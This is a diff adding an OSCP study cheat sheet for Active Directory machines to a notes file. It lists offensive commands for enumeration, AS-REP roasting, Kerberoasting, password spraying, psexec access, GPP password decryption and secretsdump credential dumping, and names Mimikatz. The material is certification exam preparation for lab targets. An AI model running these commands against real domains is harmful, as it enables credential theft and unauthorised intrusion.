@@ -29,6 +29,40 @@ prepare report
 
 ////////////////////////////
 
+how to solve AD machines in OSCP
+
+nmap -sC -sV -p- <IP_ADDRESS>
+-
+enum4linux -a <IP_ADDRESS>
+smbclient -L \\\\<IP_ADDRESS>\\
+ldapsearch -x -h <IP_ADDRESS> -b "DC=example,DC=com"
+-
+crackmapexec smb <IP_ADDRESS> --users
+rpcclient -U "" <IP_ADDRESS>
+-
+GetNPUsers.py <domain>/<user>@<ip_address> -no-pass -usersfile users.txt
+-
+GetUserSPNs.py <domain>/<user>:<password> -request
+-
+crackmapexec smb <IP_ADDRESS> -u users.txt -p Password123 --spray
+-
+psexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP_ADDRESS>
+-
+findstr /S /I cpassword \\\\<domain_ip>\\SYSVOL\\* 
+gpp-decrypt <encrypted_password>
+-
+GetUserSPNs.py -request <domain>/<user>:<password> -dc-ip <ip_address>
+-
+secretsdump.py <domain>/<admin>@<dc_ip>
+-
+**Tools to Use:**
+Impacket Suite: Provides a set of Python classes for working with network protocols.
+**BloodHound:** Great for identifying attack paths and privilege escalation opportunities in AD environments.
+**CrackMapExec:** Versatile tool for enumerating, spraying passwords, and exploiting AD machines.
+**Mimikatz:** Tool for dumping credentials and tickets from memory once you have sufficient privileges.
+
+////////////////////////////
+
 OSCP Exam Format
 The PWK course prepares for the OSCP exam, a 24-hour exam which a member of OffSec proctors to ensure you follow exam requirements. The exam consists of two parts:
 
